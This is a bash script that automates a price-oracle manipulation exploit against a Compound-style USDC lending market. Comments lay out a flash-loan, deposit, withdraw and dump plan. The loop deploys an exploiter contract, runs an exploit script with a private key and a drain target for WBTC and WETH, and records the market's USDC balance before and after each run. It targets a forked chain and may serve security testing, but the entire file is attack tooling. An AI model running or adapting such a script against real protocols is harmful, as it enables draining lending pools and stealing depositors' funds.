#! /bin/bash
echo "***EXPLOIT***"

# Assumes oracle control
# Flash loan ETH
# Convert to WETH
# Deposit into Compound
# Withdraw USDC
# Dump USDC on Uniswap
# Withdraw back to ETH

# TODO diff private key from oracles

{
    
    for i in {1..10}
    do
        # for ASSET in WETH WBTC LINK
        for ASSET in WBTC WETH
        do
            PRICE_FEED_NAME="PRICE_FEED_$ASSET" && \
            {
                PRICE_FEED="${!PRICE_FEED_NAME}";
                
                echo "***COMP BALANCES BEFORE***"
                
                echo "USDC"
                cast call $USDC "balanceOf(address)(uint256)" $CUSDC --rpc-url $RPC_URL
                
                ASSET_ADDRESS="${!ASSET}";
                echo "***Exploiting with $ASSET $ASSET_ADDRESS***" && \
                # echo "***Exploiting with $ASSET $ASSET_ADDRESS***"
                
                # TODO check price spread with mainnet
                MAINNET_PRICE=$( cast call $CUSDC "getPrice(address)(uint256)" $PRICE_FEED --rpc-url $MAINNET) && \
                echo "***Mainnet price for $ASSET : $MAINNET_PRICE***" && \
                # echo "***Mainnet price for $ASSET : $MAINNET_PRICE***"
                
                FORK_PRICE=$( cast call $CUSDC "getPrice(address)(uint256)" $PRICE_FEED --rpc-url $RPC_URL) && \
                echo "***Fork price for $ASSET : $FORK_PRICE***" && \
                # echo "***Fork price for $ASSET : $FORK_PRICE***"
                
                forge script script/DeployExploit.s.sol:Deploy --fork-url $RPC_URL --broadcast > /tmp/exploiter && \
                EXPLOITER=`cat /tmp/exploiter | grep "Contract Address:" | sed 's/^.*: //'` && \
                echo "Exploiter addres $EXPLOITER"
                EXPLOITER=$EXPLOITER ASSET=$ASSET_ADDRESS PRIVATE_KEY=$PRIVATE_KEY_2 DRAIN_TARGET= forge script script/Exploit.s.sol:Exploit --fork-url $RPC_URL --broadcast
                
                echo "***COMP BALANCES AFTER***"
                
                echo "USDC"
                cast call $USDC "balanceOf(address)(uint256)" $CUSDC --rpc-url $RPC_URL
            }
        done
        
        echo "Next exploit in 30 seconds"
        sleep 30
    done
}

exit 0